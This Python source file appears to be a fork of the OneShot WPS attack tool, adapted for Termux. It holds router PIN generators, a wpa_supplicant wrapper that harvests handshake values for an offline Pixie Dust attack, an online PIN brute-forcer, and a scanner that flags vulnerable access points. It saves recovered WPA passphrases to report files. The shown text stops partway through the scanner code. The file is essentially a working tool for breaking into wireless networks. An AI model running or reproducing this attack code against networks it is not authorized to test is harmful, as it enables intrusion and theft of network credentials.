#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import select
import pathlib
import time
from datetime import datetime
import collections
import statistics
from pathlib import Path
from typing import Dict
try:
    import wcwidth
except ImportError:
    # Fallback si no está instalado (p.ej. Termux sin 'pip install wcwidth'):
    # se degrada a ancho por carácter; la tabla puede desalinear en chars anchos (CJK)
    # pero el programa NO truena. Ver README / install.sh para la alineación correcta.
    class _WcwidthFallback:
        @staticmethod
        def wcswidth(text):
            return len(text)
    wcwidth = _WcwidthFallback()
import csv


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC_DB = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      'pinEasybox': {'name': 'EasyBox', 'mode': self.ALGO_MAC, 'gen': self.pinEasybox},
                      'pinArris': {'name': 'Arris', 'mode': self.ALGO_MAC, 'gen': self.pinArris},
                      'pinTrendNet': {'name': 'TrendNet', 'mode': self.ALGO_MAC, 'gen': self.pinTrendNet},
                      # Static pin algos
                      'pinGeneric': {'name': 'Static', 'mode': self.ALGO_STATIC_DB, 'gen': lambda mac: 1234567, 'static': []},
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''}}

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        new_algos = {'pinEmpty', 'pinEasybox', 'pinArris', 'pinTrendNet'}
        if algo in new_algos:
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC_DB:
                for pins_static in self.algos['pinGeneric']['static']:
                    if pins_static.isdigit():
                        new_item = {'name': 'Static PIN DB', 'pin': pins_static}
                        res.append(new_item)
            else:
                item['name'] = algo['name']
                item['pin'] = self.generate(ID, mac)
                res.append(item)
        self.algos['pinGeneric']['static'].clear()
        return res

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def append_from_pin_csv(self, pin_file_path, mac):
        try:
            with open(pin_file_path, newline='') as csvfile:
                reader = csv.reader(csvfile)
                for row in reader:
                    if len(row) < 2:
                        continue
                    if mac.startswith(row[1]):
                        self.algos['pinGeneric']['static'].append(row[0])
        except FileNotFoundError:
            pass

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        All the algos will be returned since they can work sometimes
        The static pins will be added only if they are included in the csv for that specific mac
        Returns the algo ID
        """
        self.append_from_pin_csv(os.path.join(os.path.dirname(os.path.realpath(__file__)), 'pins.csv'), mac.upper())
        res = []
        for algo_id in self.algos:
            res.append(algo_id)

        return res

    def pinTrendNet(self, bssid):
        try:
            last_3 = bssid.string.replace(':', '')[-6:]
            merge = last_3[4:] + last_3[2:4] + last_3[:2]
            string = int(merge, 16) % 10000000
            pin = 10 * string
            pin_with_checksum = pin + self.checksum(pin)
            return f"{pin_with_checksum:08d}"
        except ValueError:
            return "12345670"

    def pinEasybox(self, bssid):
        try:
            last_two = bssid.string.replace(':', '')[-4:]
            sn = int(last_two, 16)
            snstr = f"{sn:05d}"

            mac = [int(c, 16) for c in last_two]
            sn_digits = [int(c) for c in snstr[1:]]

            k1 = (sum(sn_digits[:2]) + sum(mac[2:])) % 16
            k2 = (sum(sn_digits[2:]) + sum(mac[:2])) % 16

            hpin = [
                k1 ^ sn_digits[3],
                k1 ^ sn_digits[2],
                k2 ^ mac[1],
                k2 ^ mac[2],
                mac[2] ^ sn_digits[3],
                mac[3] ^ sn_digits[2],
                k1 ^ sn_digits[1]
            ]

            hpin_str = ''.join(f"{x:X}" for x in hpin)
            hpinint = int(hpin_str, 16) % 10000000
            return f"{hpinint:07d}{self.checksum(hpinint)}"

        except ValueError:
            return 12345670

    def pinArris(self, bssid):
        def fib_gen(n, memo={}):
            if n in memo:
                return memo[n]
            if n in (0, 1, 2):
                return 1
            memo[n] = fib_gen(n - 1, memo) + fib_gen(n - 2, memo)
            return memo[n]

        macs = bssid.string.split(":")
        array_macs = [int(mac, 16) for mac in macs]

        fibnum = []
        for i, mac in enumerate(array_macs):
            adjusted_mac = mac
            counter = 0

            if adjusted_mac > 30:
                while adjusted_mac > 31:
                    adjusted_mac -= 16
                    counter += 1

            if counter == 0 and adjusted_mac < 3:
                adjusted_mac = sum(array_macs) - adjusted_mac
                adjusted_mac &= 0xff
                adjusted_mac = (adjusted_mac % 28) + 3

            fibnum.append(fib_gen(adjusted_mac) + (fib_gen(counter) if counter else 0))

        fibsum = sum(fib * fib_gen(i + 16) for i, fib in enumerate(fibnum)) + sum(array_macs)
        fibsum = (fibsum % 10000000 * 10) + self.checksum(fibsum)

        return f"{fibsum:08d}"

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    s = ''
    while True:
        inp = pipe.stdout.read(1)
        if inp == '':
            return s
        s += inp
        if what in s:
            return s


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        print('[*] {:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.start_time, average_pin_time))

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


class Companion:
    """Main application part"""
    def __init__(self, interface, save_result=False, print_debug=False, bssid=''):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.OneShot/sessions/'
        self.pixiewps_dir = f'{user_home}/.OneShot/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        if not os.path.exists(self.sessions_dir):
            os.makedirs(self.sessions_dir)
        if not os.path.exists(self.pixiewps_dir):
            os.makedirs(self.pixiewps_dir)

        self.generator = WPSpin()

        self.bssid = bssid
        self.lastPwr = 0

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        # Waiting for wpa_supplicant control interface initialization
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    @staticmethod
    def _explain_wpas_not_ok_status(command: str, respond: str):
        if command.startswith(('WPS_REG', 'WPS_PBC')):
            if respond == 'UNKNOWN COMMAND':
                return ('[!] It looks like your wpa_supplicant is compiled without WPS protocol support. '
                        'Please build wpa_supplicant with WPS support ("CONFIG_WPS=y")')
        return '[!] Something went wrong — check out debug log'

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None, bssid=""):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                self.__print_with_indicators('*', 'Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                self.__print_with_indicators('*', 'Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                assert(len(self.pixie_creds.e_nonce) == 16*2)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                assert(len(self.pixie_creds.pkr) == 192*2)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                assert(len(self.pixie_creds.pke) == 192*2)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                assert(len(self.pixie_creds.authkey) == 32*2)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                assert(len(self.pixie_creds.e_hash1) == 32*2)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                assert(len(self.pixie_creds.e_hash2) == 32*2)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                self.__print_with_indicators('*', 'Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            if 'msg=5 config_error=15' in line:
                print('[*] Received WPS-FAIL with reason: WPS LOCKED')
                if not pixiemode:
                    self.connection_status.status = 'WPS_FAIL'
            elif 'msg=8' in line:
                if 'config_error=15' in line:
                    print('[*] Received WPS-FAIL with reason: WPS LOCKED')
                    if not pixiemode:
                        self.connection_status.status = 'WPS_FAIL'
                else:
                    self.connection_status.status = 'WSC_NACK'
                    print('[-] Error: PIN was wrong')
            elif 'config_error=2' in line:
                print('[*] Received WPS-FAIL with reason: CRC FAILURE')
                self.connection_status.status = 'WPS_FAIL'
            else:
                self.connection_status.status = 'WPS_FAIL'
#        elif 'NL80211_CMD_DEL_STATION' in line:
#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Authenticating…')
        elif 'Authentication response' in line:
            self.__print_with_indicators('*', 'Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            self.__print_with_indicators('*', 'Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                self.__print_with_indicators('+', 'Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                self.__print_with_indicators('+', 'Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            self.__print_with_indicators('*', 'Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            self.__print_with_indicators('*', 'Received Identity Request')
        elif 'using real identity' in line:
            self.__print_with_indicators('*', 'Sending Identity Response…')
        elif self.bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selected AP: {}'.format(bssid))
        elif bssid in line and 'level=' in line:
            signal = line.split("level=")[1].split(" ")[0]
            if 'noise=' in line:
                noise = line.split("noise=")[1].split(" ")[0]
                print ("[i] Current signal: {}, noise: {}".format(signal, noise))
            else:
                print ("[i] Current signal: {}".format(signal))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        self.__print_with_indicators('*', 'Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __credentialPrint(self, wps_pin=None, wpa_psk=None, essid=None):
        print(f"[+] WPS PIN: '{wps_pin}'")
        print(f"[+] WPA PSK: '{wpa_psk}'")
        print(f"[+] AP SSID: '{essid}'")

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('{}\nBSSID: {}\nESSID: {}\nWPS PIN: {}\nWPA PSK: {}\n\n'.format(
                        dateStr, bssid, essid, wps_pin, wpa_psk
                    )
            )
        writeTableHeader = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[i] Credentials saved to {filename}.txt, {filename}.csv')

    def __savePin(self, bssid, pin):
        filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
        with open(filename, 'w') as file:
            file.write(pin)
        print('[i] PIN saved in {}'.format(filename))

    def __prompt_wpspin(self, bssid):
        pins = self.generator.getSuggested(bssid)
        if len(pins) > 1:
            print(f'PINs generated for {bssid}:')
            print('{:<3} {:<10} {:<}'.format('#', 'PIN', 'Name'))
            for i, pin in enumerate(pins):
                number = '{})'.format(i + 1)
                line = '{:<3} {:<10} {:<}'.format(
                    number, pin['pin'], pin['name'])
                print(line)
            while 1:
                pinNo = input('Select the PIN: ')
                try:
                    if int(pinNo) in range(1, len(pins)+1):
                        pin = pins[int(pinNo) - 1]['pin']
                    else:
                        raise IndexError
                except Exception:
                    print('Invalid number')
                else:
                    break
        elif len(pins) == 1:
            pin = pins[0]
            print('[i] The only probable PIN is selected:', pin['name'])
            pin = pin['pin']
        else:
            return None
        return pin

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)   # Clean the pipe
        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'

        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print(self._explain_wpas_not_ok_status(cmd, r))
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose, bssid=bssid.lower() if bssid else '')
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, ssid=None, pin=None, pixiemode=False, pbc_mode=False, showpixiecmd=False,
                          pixieforce=False, store_pin_on_fail=False):
        if not pin:
            if pixiemode:
                try:
                    # Try using the previously calculated PIN
                    filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                    with open(filename, 'r') as file:
                        t_pin = file.readline().strip()
                        if input('[?] Use previously calculated PIN {}? [n/Y] '.format(t_pin)).lower() != 'n':
                            pin = t_pin
                        else:
                            raise FileNotFoundError
                except FileNotFoundError:
                    pin = self.generator.getLikely(bssid) or '12345670'
            elif not pbc_mode:
                # If not pixiemode, ask user to select a pin from the list
                pin = self.__prompt_wpspin(bssid) or '12345670'
        if pbc_mode:
            self.__wps_connection(bssid, pbc_mode=pbc_mode)
            bssid = self.connection_status.bssid
            pin = '<PBC mode>'
        elif store_pin_on_fail:
            try:
                self.__wps_connection(bssid, pin, pixiemode)
            except KeyboardInterrupt:
                print("\nAborting…")
                self.__savePin(bssid, pin)
                return False
        else:
            self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            self.__credentialPrint(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            if self.save_result:
                self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            if not pbc_mode:
                # Try to remove temporary PIN file
                filename = self.pixiewps_dir + '{}.run'.format(bssid.replace(':', '').upper())
                try:
                    os.remove(filename)
                except FileNotFoundError:
                    pass
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pixiedust_pin = self.__runPixiewps(showpixiecmd, pixieforce)
                if pixiedust_pin:
                    return self.single_connection(bssid, pin=pixiedust_pin, pixiemode=False, store_pin_on_fail=True)
                return False
            else:
                print('[!] Not enough data to run Pixie Dust attack')
                return False
        else:
            if store_pin_on_fail:
                # Saving Pixiewps calculated PIN if can't connect
                self.__savePin(bssid, pin)
            return False

    def __first_half_bruteforce(self, bssid, f_half, delay=None, retries=0):
        """
        @f_half — 4-character string
        """
        checksum = self.generator.checksum
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = '{}000{}'.format(f_half, checksum(t))
            self.single_connection(bssid, pin=pin)
            if self.connection_status.isFirstHalfValid():
                print('[+] First half found')
                return f_half
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                if retries >= 5:
                    print('[-] Too many WPS failures, aborting bruteforce')
                    return False
                return self.__first_half_bruteforce(bssid, f_half, delay, retries + 1)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bruteforce.registerAttempt(f_half)
            if delay:
                time.sleep(delay)
        print('[-] First half not found')
        return False

    def __second_half_bruteforce(self, bssid, f_half, s_half, delay=None, retries=0):
        """
        @f_half — 4-character string
        @s_half — 3-character string
        """
        checksum = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = '{}{}{}'.format(f_half, s_half, checksum(t))
            self.single_connection(bssid, pin=pin)
            if self.connection_status.last_m_message > 6:
                return pin
            elif self.connection_status.status == 'WPS_FAIL':
                print('[!] WPS transaction failed, re-trying last pin')
                if retries >= 5:
                    print('[-] Too many WPS failures, aborting bruteforce')
                    return False
                return self.__second_half_bruteforce(bssid, f_half, s_half, delay, retries + 1)
            s_half = str(int(s_half) + 1).zfill(3)
            self.bruteforce.registerAttempt(f_half + s_half)
            if delay:
                time.sleep(delay)
        return False

    def smart_bruteforce(self, bssid, start_pin=None, delay=None):
        if (not start_pin) or (len(start_pin) < 4):
            # Trying to restore previous session
            try:
                filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
                with open(filename, 'r') as file:
                    if input('[?] Restore previous session for {}? [n/Y] '.format(bssid)).lower() != 'n':
                        mask = file.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = start_pin[:7]

        try:
            self.bruteforce = BruteforceStatus()
            self.bruteforce.mask = mask
            if len(mask) == 4:
                f_half = self.__first_half_bruteforce(bssid, mask, delay)
                if f_half and (self.connection_status.status != 'GOT_PSK'):
                    self.__second_half_bruteforce(bssid, f_half, '001', delay)
            elif len(mask) == 7:
                f_half = mask[:4]
                s_half = mask[4:]
                self.__second_half_bruteforce(bssid, f_half, s_half, delay)
            raise KeyboardInterrupt
        except KeyboardInterrupt:
            print("\nAborting…")
            filename = self.sessions_dir + '{}.run'.format(bssid.replace(':', '').upper())
            with open(filename, 'w') as file:
                file.write(self.bruteforce.mask)
            print('[i] Session saved in {}'.format(filename))
            if args.loop:
                raise KeyboardInterrupt

    def __print_with_indicators(self, level, msg):
        print('[{}] [{}] {}'.format(level, self.lastPwr, msg))

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)

    def __del__(self):
        #self.cleanup()
        try:
            self.cleanup()
        except (ImportError, AttributeError, TypeError):
            pass


class WiFiScanner:
    """docstring for WiFiScanner"""
    def __init__(self, interface, vuln_list=None):
        self.interface = interface
        self.vuln_list = vuln_list

        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                # Skip header
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append(
                        (
                            row[1],   # BSSID
                            row[2]    # ESSID
                        )
                    )
        except FileNotFoundError:
            self.stored = []

    @staticmethod
    def _notify_vulnerable():
        """Aviso best-effort en Termux al detectar un AP probablemente vulnerable.
        Requiere el paquete termux-api (termux-vibrate) y play-audio; si no estan
        instalados no hace nada (no rompe en Linux normal)."""
        if shutil.which('termux-vibrate'):
            subprocess.Popen(['termux-vibrate', '-f'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        knock = os.path.join(os.path.dirname(os.path.realpath(__file__)), 'knock.ogg')
        if shutil.which('play-audio') and os.path.isfile(knock):
            subprocess.Popen(['play-audio', knock],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def checkvuln_from_pin_csv(self, pin_file_path, mac):
        try:
            with open(pin_file_path, newline='') as csvfile:
                reader = csv.reader(csvfile)
                for row in reader:
                    if len(row) < 2:
                        continue
                    if mac.startswith(row[1]):
                        return True
        except FileNotFoundError:
            return False

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append(
                    {
                        'Security type': 'Unknown',
                        'WPS': False,
                        'WPS locked': False,
                        'Model': '',
                        'Model number': '',
                        'Device name': ''
                     }
                )
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = (codecs.decode(d, 'unicode-escape')
                                     .encode('latin1').decode('utf-8', errors='replace'))

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_securityType(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                if 'Privacy' in result.group(2):
                    sec = 'WEP'
                else:
                    sec = 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN':
                    sec = 'WPA2'
                elif result.group(1) == 'WPA':
                    sec = 'WPA'
            elif sec == 'WPA':
